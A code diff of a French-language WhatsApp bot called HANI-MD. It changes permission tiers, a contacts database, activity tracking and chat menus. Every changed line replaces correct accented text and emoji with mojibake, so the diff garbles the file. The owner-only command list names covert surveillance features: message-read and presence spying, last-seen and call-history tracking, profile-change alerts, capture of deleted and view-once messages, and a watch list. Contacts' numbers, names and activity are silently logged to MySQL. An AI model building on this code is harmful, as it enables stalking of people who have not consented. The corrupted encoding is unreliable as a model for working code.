   const num = String(jid).split("@")[0].split(":")[0];
   if (isLID(num)) return null;
   return num;
 };
 
-// 📇 FONCTION GLOBALE pour formater un numéro de téléphone joliment
+// ðŸ“‡ FONCTION GLOBALE pour formater un numÃ©ro de tÃ©lÃ©phone joliment
 const formatPhoneForDisplay = (number) => {
   if (!number) return "Inconnu";
   const clean = String(number).replace(/[^0-9]/g, '');
   
-  // Vérifier si c'est un LID (pas un vrai numéro)
+  // VÃ©rifier si c'est un LID (pas un vrai numÃ©ro)
   if (isLID(clean)) {
-    return "❌ LID (pas un vrai numéro)";
+    return "âŒ LID (pas un vrai numÃ©ro)";
   }
   
-  // Côte d'Ivoire: +225 XX XX XX XX XX
+  // CÃ´te d'Ivoire: +225 XX XX XX XX XX
   if (clean.length === 12 && clean.startsWith("225")) {
     return `+225 ${clean.slice(3,5)} ${clean.slice(5,7)} ${clean.slice(7,9)} ${clean.slice(9,11)} ${clean.slice(11)}`;
   } 
@@ -919,28 +919,28 @@ const formatPhoneForDisplay = (number) => {
   else if (clean.length === 11 && clean.startsWith("33")) {
     return `+33 ${clean.slice(2,3)} ${clean.slice(3,5)} ${clean.slice(5,7)} ${clean.slice(7,9)} ${clean.slice(9)}`;
   } 
-  // Autre pays (numéro valide)
+  // Autre pays (numÃ©ro valide)
   else if (clean.length >= 10 && clean.length <= 14) {
     return `+${clean.slice(0,3)} ${clean.slice(3,6)} ${clean.slice(6,9)} ${clean.slice(9)}`;
   }
   return `+${clean}`;
 };
 
-// ═══════════════════════════════════════════════════════════
-// 🎫 SYSTÈME DE PERMISSIONS - COMMANDES PAR NIVEAU
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸŽ« SYSTÃˆME DE PERMISSIONS - COMMANDES PAR NIVEAU
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// Commandes accessibles à TOUT LE MONDE (users normaux)
+// Commandes accessibles Ã  TOUT LE MONDE (users normaux)
 const publicCommands = [
-  // Général
+  // GÃ©nÃ©ral
   "ping", "menu", "help", "info", "runtime", "uptime", "alive",
   // Permissions (chacun peut voir son niveau)
   "permissions", "myaccess", "mylevel", "whoami",
   // Fun basique
   "sticker", "s", "toimg", "toimage",
-  // Téléchargement basique
+  // TÃ©lÃ©chargement basique
   "tiktok", "tt", "ytmp3", "ytmp4", "play", "song", "video",
-  // IA (limité)
+  // IA (limitÃ©)
   "gpt", "ai", "gemini",
   // Outils basiques
   "calc", "tts", "translate", "tr",
@@ -948,9 +948,9 @@ const publicCommands = [
   "profil", "profile", "me", "level", "rank",
 ];
 
-// Commandes pour utilisateurs APPROUVÉS (approved) - EXCLUSIVES (pas inclure public)
+// Commandes pour utilisateurs APPROUVÃ‰S (approved) - EXCLUSIVES (pas inclure public)
 const approvedOnlyCommands = [
-  // Téléchargement avancé
+  // TÃ©lÃ©chargement avancÃ©
   "ig", "instagram", "fb", "facebook", "twitter", "x",
   "pinterest", "pin", "spotify", "mediafire",
   // Recherche
@@ -961,28 +961,28 @@ const approvedOnlyCommands = [
   "slot", "dice", "flip", "rps",
 ];
 
-// Toutes les commandes approved (pour compatibilité)
+// Toutes les commandes approved (pour compatibilitÃ©)
 const approvedCommands = [...publicCommands, ...approvedOnlyCommands];
 
 // Commandes pour SUDO (admins de confiance) - EXCLUSIVES (pas inclure approved)
 const sudoOnlyCommands = [
-  // Groupe (modération)
+  // Groupe (modÃ©ration)
   "kick", "add", "promote", "demote", "mute", "unmute",
   "hidetag", "tagall", "antilink", "antispam",
-  // Outils avancés
+  // Outils avancÃ©s
   "broadcast", "bc",
 ];
 
-// Toutes les commandes sudo (pour compatibilité)
+// Toutes les commandes sudo (pour compatibilitÃ©)
 const sudoCommands = [...approvedCommands, ...sudoOnlyCommands];
 
 // Commandes OWNER SEULEMENT (toi uniquement)
 const ownerOnlyCommands = [
-  // Contrôle total
+  // ContrÃ´le total
   "eval", "exec", "shell", "restart", "shutdown",
   // Mode du bot
   "mode",
-  // Diagnostic système
+  // Diagnostic systÃ¨me
   "diagnostic", "diag", "health", "sante",
   // Gestion utilisateurs
   "ban", "unban", "sudo", "delsudo", "addsudo", "removesudo", "sudolist",
@@ -996,14 +996,14 @@ const ownerOnlyCommands = [
   "setprefix", "setname", "setbio", "setpp", "setppgroup",
   // Debug
   "test", "debug", "clearsession",
-  // Surveillance (tes fonctionnalités privées)
+  // Surveillance (tes fonctionnalitÃ©s privÃ©es)
   "deleted", "delmsg", "deletedstatus", "delstatus",
   "vv", "viewonce", "getstatus", "spy", "track", "activity", "invisible",
-  // Commandes espion séparées (basiques)
+  // Commandes espion sÃ©parÃ©es (basiques)
   "spyread", "quilit", "spyreply", "quirepond", "spypresence", "quiouvre", "quiecrit",
   "spyhistory", "spyall", "espionhistorique", "spystatus", "quivoitmesstatus",
   "spyon", "spyoff", "spyclear",
-  // Commandes espion avancées
+  // Commandes espion avancÃ©es
   "lastseen", "derniereconnexion", "online",
   "profilechanges", "changementsprofil", "alertprofil",
   "callhistory", "historiqueappels", "appels",
@@ -1014,14 +1014,14 @@ const ownerOnlyCommands = [
   "trackconfig", "spyconfig", "configespion",
   // Auto ViewOnce
   "autoviewonce", "autovo", "viewonceauto",
-  // Messages programmés
+  // Messages programmÃ©s
   "schedule", "programmer", "planifier",
   "schedulerepeat", "programmerrepeat", "messagerecurrent",
   "schedulelist", "programmelist", "listeprogrammes",
   "scheduledel", "schedulecancel", "supprimerprogramme",
   "scheduleclear", "clearschedule",
   "schedulepause", "pauseprogramme",
-  // Statuts programmés
+  // Statuts programmÃ©s
   "statusschedule", "schedulestatus", "programstatus", "statutprogramme",
   "statusrepeat", "repeatstatus", "statutrecurrent",
   "statuslist", "liststatus", "statutslist",
@@ -1033,15 +1033,15 @@ const ownerOnlyCommands = [
   "song", "music", "chanson",
 ];
 
-// Liste des utilisateurs approuvés
+// Liste des utilisateurs approuvÃ©s
 const approvedUsers = new Set();
 
-// 🤖 DÉTECTION BOT DÉSACTIVÉE
-// La détection automatique et le blocage des bots sont désactivés
+// ðŸ¤– DÃ‰TECTION BOT DÃ‰SACTIVÃ‰E
+// La dÃ©tection automatique et le blocage des bots sont dÃ©sactivÃ©s
 
-// ═══════════════════════════════════════════════════════════
-// 💾 STOCKAGE EN MÉMOIRE
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ’¾ STOCKAGE EN MÃ‰MOIRE
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 const messageStore = new Map();
 const MAX_STORED_MESSAGES = 500;
@@ -1051,19 +1051,19 @@ const viewOnceMessages = new Map();
 const spamTracker = new Map(); // Pour antispam
 
 // Stockage des statuts
-const statusStore = new Map();        // Tous les statuts reçus
-const deletedStatuses = [];           // Statuts supprimés
+const statusStore = new Map();        // Tous les statuts reÃ§us
+const deletedStatuses = [];           // Statuts supprimÃ©s
 const MAX_STORED_STATUSES = 100;
 const MAX_DELETED_STATUSES = 50;
 
-// ═══════════════════════════════════════════════════════════
-// 📇 BASE DE DONNÉES DES CONTACTS - MySQL uniquement
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ“‡ BASE DE DONNÃ‰ES DES CONTACTS - MySQL uniquement
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// Structure pour stocker les contacts en mémoire (cache)
-const contactsDB = new Map();  // numéro -> { name, jid, firstSeen, lastSeen, ... }
+// Structure pour stocker les contacts en mÃ©moire (cache)
+const contactsDB = new Map();  // numÃ©ro -> { name, jid, firstSeen, lastSeen, ... }
 
-// Charger les contacts depuis MySQL au démarrage
+// Charger les contacts depuis MySQL au dÃ©marrage
 async function loadContactsFromMySQL() {
   try {
     const contacts = await mysqlDB.getAllContacts();
@@ -1083,24 +1083,24 @@ async function loadContactsFromMySQL() {
           });
         }
       }
-      console.log(`[CONTACTS] ${contactsDB.size} contacts chargés depuis MySQL`);
+      console.log(`[CONTACTS] ${contactsDB.size} contacts chargÃ©s depuis MySQL`);
     }
   } catch (e) {
     console.log(`[CONTACTS] Erreur chargement MySQL: ${e.message}`);
   }
 }
 
-// Charger les contacts au démarrage (après connexion MySQL)
+// Charger les contacts au dÃ©marrage (aprÃ¨s connexion MySQL)
 setTimeout(() => loadContactsFromMySQL(), 5000);
 
-// Ajouter ou mettre à jour un contact
+// Ajouter ou mettre Ã  jour un contact
 async function updateContact(jid, pushName, additionalData = {}) {
   if (!jid) return null;
   
   const number = jid.split("@")[0];
   if (!number || number.length < 8) return null;
   
-  // Vérifier si c'est un vrai numéro (pas un ID de groupe)
+  // VÃ©rifier si c'est un vrai numÃ©ro (pas un ID de groupe)
   if (jid.endsWith("@g.us") || jid.includes("-")) return null;
   
   const now = new Date().toLocaleString("fr-FR");
@@ -1126,19 +1126,19 @@ async function updateContact(jid, pushName, additionalData = {}) {
       await mysqlDB.saveContact(jid, pushName || "Inconnu", number, pushName || "");
     } catch (e) {}
     
-    console.log(`📇 Nouveau contact: ${pushName || number} (${formatPhoneNumber(number)})`);
+    console.log(`ðŸ“‡ Nouveau contact: ${pushName || number} (${formatPhoneNumber(number)})`);
   } else {
-    // Contact existant - mise à jour
+    // Contact existant - mise Ã  jour
     const contact = contactsDB.get(number);
     if (pushName && pushName.length > 1 && pushName !== "Inconnu") {
       contact.name = pushName;
     }
     contact.lastSeen = now;
     contact.messageCount++;
-    // Fusionner les données additionnelles
+    // Fusionner les donnÃ©es additionnelles
     Object.assign(contact, additionalData);
     
-    // Mettre à jour dans MySQL périodiquement
+    // Mettre Ã  jour dans MySQL pÃ©riodiquement
     if (contact.messageCount % 10 === 0) {
       try {
         await mysqlDB.saveContact(jid, contact.name, number, pushName || "");
@@ -1149,25 +1149,25 @@ async function updateContact(jid, pushName, additionalData = {}) {
   return contactsDB.get(number);
 }
 
-// Récupérer un contact par numéro
+// RÃ©cupÃ©rer un contact par numÃ©ro
 function getContact(numberOrJid) {
   const number = numberOrJid?.split("@")[0]?.replace(/[^0-9]/g, "");
   return contactsDB.get(number) || null;
 }
 
-// Récupérer le nom d'un contact
+// RÃ©cupÃ©rer le nom d'un contact
 function getContactName(numberOrJid) {
   const contact = getContact(numberOrJid);
   if (contact && contact.name && contact.name !== "Inconnu") {
     return contact.name;
   }
-  // Fallback: numéro formaté
+  // Fallback: numÃ©ro formatÃ©
   const number = numberOrJid?.split("@")[0];
   return formatPhoneNumber(number);
 }
 
-// 🆕 OBTENIR INFOS COMPLÈTES D'UN CONTACT (Nom + Numéro)
-// Si numéro > 13 chiffres, affiche juste le nom WhatsApp
+// ðŸ†• OBTENIR INFOS COMPLÃˆTES D'UN CONTACT (Nom + NumÃ©ro)
+// Si numÃ©ro > 13 chiffres, affiche juste le nom WhatsApp
 function getContactInfo(numberOrJid) {
   if (!numberOrJid) return "Inconnu";
   
@@ -1177,11 +1177,11 @@ function getContactInfo(numberOrJid) {
   const contact = contactsDB.get(number);
   const formattedNum = formatPhoneNumber(number);
   
-  // Si numéro dépasse 13 chiffres, afficher juste le nom
+  // Si numÃ©ro dÃ©passe 13 chiffres, afficher juste le nom
   const isTooLong = number.length > 13;
   
   if (contact && contact.name && contact.name !== "Inconnu" && contact.name.length > 1) {
-    // Numéro trop long = juste le nom
+    // NumÃ©ro trop long = juste le nom
     if (isTooLong) return contact.name;
     return `${contact.name} (${formattedNum})`;
   }
@@ -1193,7 +1193,7 @@ function getContactInfo(numberOrJid) {
     return `${cachedName} (${formattedNum})`;
   }
   
-  // Pas de nom trouvé
+  // Pas de nom trouvÃ©
   if (isTooLong) return "Contact WhatsApp";
   return formattedNum;
 }
@@ -1203,7 +1203,7 @@ function getAllContacts() {
   return Array.from(contactsDB.values());
 }
 
-// Rechercher un contact par nom ou numéro
+// Rechercher un contact par nom ou numÃ©ro
 function searchContacts(query) {
   const q = query.toLowerCase();
   return getAllContacts().filter(c => 
@@ -1213,14 +1213,14 @@ function searchContacts(query) {
   );
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🕵️ SYSTÈME DE SURVEILLANCE / TRACKING
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ•µï¸ SYSTÃˆME DE SURVEILLANCE / TRACKING
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-const activityTracker = new Map();    // Suivi d'activité par utilisateur
-const watchList = new Set();          // Liste des numéros à surveiller
-const mediaStore = new Map();         // Stockage des médias reçus par utilisateur
-const MAX_MEDIA_PER_USER = 20;        // Max médias stockés par utilisateur
+const activityTracker = new Map();    // Suivi d'activitÃ© par utilisateur
+const watchList = new Set();          // Liste des numÃ©ros Ã  surveiller
+const mediaStore = new Map();         // Stockage des mÃ©dias reÃ§us par utilisateur
+const MAX_MEDIA_PER_USER = 20;        // Max mÃ©dias stockÃ©s par utilisateur
 
 function trackActivity(jid, pushName, type, chatWith) {
   const number = jid?.split("@")[0];
@@ -1243,7 +1243,7 @@ function trackActivity(jid, pushName, type, chatWith) {
   tracker.lastSeen = new Date().toLocaleString("fr-FR");
   tracker.messageCount++;
   
-  // Ajouter l'activité (garder les 50 dernières)
+  // Ajouter l'activitÃ© (garder les 50 derniÃ¨res)
   tracker.activities.push({
     type: type,
     time: new Date().toLocaleString("fr-FR"),
@@ -1257,21 +1257,21 @@ function trackActivity(jid, pushName, type, chatWith) {
   }
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🔧 FONCTIONS UTILITAIRES
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ”§ FONCTIONS UTILITAIRES
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// Formater un numéro au format +225 XX XX XX XX XX (Côte d'Ivoire)
+// Formater un numÃ©ro au format +225 XX XX XX XX XX (CÃ´te d'Ivoire)
 function formatPhoneNumber(number) {
   if (!number) return "Inconnu";
   
-  // Nettoyer le numéro (enlever @s.whatsapp.net, @g.us, etc.)
+  // Nettoyer le numÃ©ro (enlever @s.whatsapp.net, @g.us, etc.)
   let clean = number.toString().replace(/@.+$/, "").replace(/[^0-9]/g, "");
   
   // Format ivoirien: 225 + 10 chiffres
   if (clean.startsWith("225") && clean.length >= 12) {
     const prefix = "+225";
-    const num = clean.substring(3); // Les 10 chiffres après 225
+    const num = clean.substring(3); // Les 10 chiffres aprÃ¨s 225
     // Formater: XX XX XX XX XX
     if (num.length >= 10) {
       return `${prefix} ${num.substring(0, 2)} ${num.substring(2, 4)} ${num.substring(4, 6)} ${num.substring(6, 8)} ${num.substring(8, 10)}`;
@@ -1292,13 +1292,13 @@ function getMessageText(msg) {
   
   const m = msg.message;
   
-  // 🔧 DEBUG: Afficher les clés du message pour comprendre la structure
+  // ðŸ”§ DEBUG: Afficher les clÃ©s du message pour comprendre la structure
   const keys = Object.keys(m);
   if (keys.length > 0 && !keys.includes('messageContextInfo') && keys[0] !== 'reactionMessage') {
     console.log(`[GETTEXT] Message keys: ${keys.join(", ")}`);
   }
   
-  // Gérer viewOnceMessageV2 et viewOnceMessageV2Extension
+  // GÃ©rer viewOnceMessageV2 et viewOnceMessageV2Extension
   if (m.viewOnceMessageV2) {
     return getMessageText({ message: m.viewOnceMessageV2.message });
   }
@@ -1309,7 +1309,7 @@ function getMessageText(msg) {
     return getMessageText({ message: m.viewOnceMessage.message });
   }
   
-  // 🆕 Gérer le type "chat" (nouveau format WhatsApp)
+  // ðŸ†• GÃ©rer le type "chat" (nouveau format WhatsApp)
   if (m.chat) {
     if (typeof m.chat === 'string') return m.chat;
     if (m.chat?.text) return m.chat.text;
@@ -1332,7 +1332,7 @@ function getMessageText(msg) {
     } catch {}
   }
   
-  // Fallback: chercher du texte dans n'importe quelle propriété
+  // Fallback: chercher du texte dans n'importe quelle propriÃ©tÃ©
   const type = getContentType(m);
   if (type && m[type]) {
     const content = m[type];
@@ -1344,12 +1344,12 @@ function getMessageText(msg) {
     if (content?.displayText) return content.displayText;
   }
   
-  // 🔧 Dernier recours: chercher récursivement du texte
+  // ðŸ”§ Dernier recours: chercher rÃ©cursivement du texte
   for (const key of keys) {
     if (key === 'messageContextInfo' || key === 'senderKeyDistributionMessage') continue;
     const val = m[key];
     if (typeof val === 'string' && val.length > 0 && val.length < 1000) {
-      console.log(`[GETTEXT] Trouvé texte dans "${key}": ${val.slice(0, 50)}`);
+      console.log(`[GETTEXT] TrouvÃ© texte dans "${key}": ${val.slice(0, 50)}`);
       return val;
     }
     if (val && typeof val === 'object') {
@@ -1386,284 +1386,284 @@ function formatNumber(number) {
   return number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 }
 
-// Valider si c'est un vrai numéro de téléphone (pas un ID de groupe/message)
+// Valider si c'est un vrai numÃ©ro de tÃ©lÃ©phone (pas un ID de groupe/message)
 function isValidPhoneNumber(num) {
   if (!num) return false;
   const cleaned = num.replace(/[^0-9]/g, "");
-  // Un numéro valide a entre 10 et 15 chiffres
+  // Un numÃ©ro valide a entre 10 et 15 chiffres
   return cleaned.length >= 10 && cleaned.length <= 15;
 }
 
 // Cache pour stocker les noms des contacts
 const contactNamesCache = new Map();
 
-// Stocker le nom d'un contact (accepte les numéros ET les LID)
+// Stocker le nom d'un contact (accepte les numÃ©ros ET les LID)
 function cacheContactName(jid, name) {
   if (jid && name && name.length > 1) {
     const num = jid.split("@")[0];
-    // Accepter les numéros de téléphone valides OU les LID (identifiants internes WhatsApp)
+    // Accepter les numÃ©ros de tÃ©lÃ©phone valides OU les LID (identifiants internes WhatsApp)
     if (num && (isValidPhoneNumber(num) || /^\d{10,20}$/.test(num))) {
       contactNamesCache.set(num, name);
     }
   }
 }
 
-// Récupérer le nom d'un contact depuis le cache
+// RÃ©cupÃ©rer le nom d'un contact depuis le cache
 function getCachedContactName(jid) {
   const num = jid?.split("@")[0];
   return contactNamesCache.get(num) || null;
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🎨 MENUS ET TEXTES (SIMPLIFIÉ)
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸŽ¨ MENUS ET TEXTES (SIMPLIFIÃ‰)
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 function getMainMenu(prefix, userRole = "user") {
   const time = new Date();
   const hours = time.getHours();
-  const greeting = hours < 12 ? "🌅 Bonjour" : hours < 18 ? "☀️ Bon après-midi" : "🌙 Bonsoir";
+  const greeting = hours < 12 ? "ðŸŒ… Bonjour" : hours < 18 ? "â˜€ï¸ Bon aprÃ¨s-midi" : "ðŸŒ™ Bonsoir";
   
-  // Menu pour les USERS (accès basique)
+  // Menu pour les USERS (accÃ¨s basique)
   if (userRole === "user") {
     return `
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃  ╔═══════════════════╗  ┃
-┃  ║  🤖 *HANI-MD* 2.6  ║  ┃
-┃  ╚═══════════════════╝  ┃
-┣━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ ${greeting}!                 ┃
-┃ 📌 Préfixe: *${prefix}*            ┃
-┃ 👤 Rôle: *Utilisateur*       ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
+â”ƒ  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  â”ƒ
+â”ƒ  â•‘  ðŸ¤– *HANI-MD* 2.6  â•‘  â”ƒ
+â”ƒ  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”ƒ
+â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
+â”ƒ ${greeting}!                 â”ƒ
+â”ƒ ðŸ“Œ PrÃ©fixe: *${prefix}*            â”ƒ
+â”ƒ ðŸ‘¤ RÃ´le: *Utilisateur*       â”ƒ
+â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›
 
-┌──────「 📌 GÉNÉRAL 」──────┐
-│ ${prefix}menu   ➜ Ce menu
-│ ${prefix}ping   ➜ Test connexion
-│ ${prefix}info   ➜ Infos bot
-│ ${prefix}whoami ➜ Ton profil
-└────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ“Œ GÃ‰NÃ‰RAL ã€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}menu   âžœ Ce menu
+â”‚ ${prefix}ping   âžœ Test connexion
+â”‚ ${prefix}info   âžœ Infos bot
+â”‚ ${prefix}whoami âžœ Ton profil
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌──────「 🔧 OUTILS 」──────┐
-│ ${prefix}sticker ➜ Créer sticker
-│ ${prefix}calc    ➜ Calculatrice
-└────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ”§ OUTILS ã€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}sticker âžœ CrÃ©er sticker
+â”‚ ${prefix}calc    âžœ Calculatrice
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌──────「 💎 PREMIUM 」──────┐
-│ ${prefix}premium ➜ Voir les plans
-│ ${prefix}myplan  ➜ Mon abonnement
-│ ${prefix}plans   ➜ Comparer les plans
-│ ${prefix}upgrade ➜ Activer un code
-└────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ’Ž PREMIUM ã€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}premium âžœ Voir les plans
+â”‚ ${prefix}myplan  âžœ Mon abonnement
+â”‚ ${prefix}plans   âžœ Comparer les plans
+â”‚ ${prefix}upgrade âžœ Activer un code
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌──────「 🔒 LIMITÉ 」──────┐
-│ ❌ Commandes groupe
-│ ❌ Protections bot
-│ ❌ Fonctions avancées
-│
-│ 💡 Demande l'accès au owner!
-└────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€ã€Œ ðŸ”’ LIMITÃ‰ ã€â”€â”€â”€â”€â”€â”€â”
+â”‚ âŒ Commandes groupe
+â”‚ âŒ Protections bot
+â”‚ âŒ Fonctions avancÃ©es
+â”‚
+â”‚ ðŸ’¡ Demande l'accÃ¨s au owner!
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 `;
   }
   
-  // Menu pour les APPROVED (accès intermédiaire)
+  // Menu pour les APPROVED (accÃ¨s intermÃ©diaire)
   if (userRole === "approved") {
     return `
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃  ╔═══════════════════╗  ┃
-┃  ║  🤖 *HANI-MD* 2.6  ║  ┃
-┃  ╚═══════════════════╝  ┃
-┣━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ ${greeting}!                 ┃
-┃ 📌 Préfixe: *${prefix}*            ┃
-┃ ✅ Rôle: *Approuvé*          ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
+â”ƒ  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  â”ƒ
+â”ƒ  â•‘  ðŸ¤– *HANI-MD* 2.6  â•‘  â”ƒ
+â”ƒ  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”ƒ
+â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
+â”ƒ ${greeting}!                 â”ƒ
+â”ƒ ðŸ“Œ PrÃ©fixe: *${prefix}*            â”ƒ
+â”ƒ âœ… RÃ´le: *ApprouvÃ©*          â”ƒ
+â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›
 
-┌───「 📌 GÉNÉRAL 」───┐
-│ ${prefix}menu • ${prefix}ping • ${prefix}info
-└──────────────────────┘
+â”Œâ”€â”€â”€ã€Œ ðŸ“Œ GÃ‰NÃ‰RAL ã€â”€â”€â”€â”
+â”‚ ${prefix}menu â€¢ ${prefix}ping â€¢ ${prefix}info
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌───「 🔧 OUTILS 」───┐
-│ ${prefix}sticker • ${prefix}calc
-└──────────────────────┘
+â”Œâ”€â”€â”€ã€Œ ðŸ”§ OUTILS ã€â”€â”€â”€â”
+â”‚ ${prefix}sticker â€¢ ${prefix}calc
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌───「 🔒 NON DISPONIBLE 」───┐
-│ ❌ Admin groupe
-│ ❌ Protections
-└─────────────────────────────┘
+â”Œâ”€â”€â”€ã€Œ ðŸ”’ NON DISPONIBLE ã€â”€â”€â”€â”
+â”‚ âŒ Admin groupe
+â”‚ âŒ Protections
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 `;
   }
   
-  // Menu pour les SUDO (accès étendu)
+  // Menu pour les SUDO (accÃ¨s Ã©tendu)
   if (userRole === "sudo") {
     return `
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃  ╔═══════════════════╗  ┃
-┃  ║  🤖 *HANI-MD* 2.6  ║  ┃
-┃  ╚═══════════════════╝  ┃
-┣━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ ${greeting}!                 ┃
-┃ 📌 Préfixe: *${prefix}*            ┃
-┃ ⚡ Rôle: *Sudo*              ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
+â”ƒ  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  â”ƒ
+â”ƒ  â•‘  ðŸ¤– *HANI-MD* 2.6  â•‘  â”ƒ
+â”ƒ  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”ƒ
+â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
+â”ƒ ${greeting}!                 â”ƒ
+â”ƒ ðŸ“Œ PrÃ©fixe: *${prefix}*            â”ƒ
+â”ƒ âš¡ RÃ´le: *Sudo*              â”ƒ
+â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›
 
-┌───「 📌 BASIQUES 」───┐
-│ ${prefix}menu • ${prefix}ping • ${prefix}info
-└───────────────────────┘
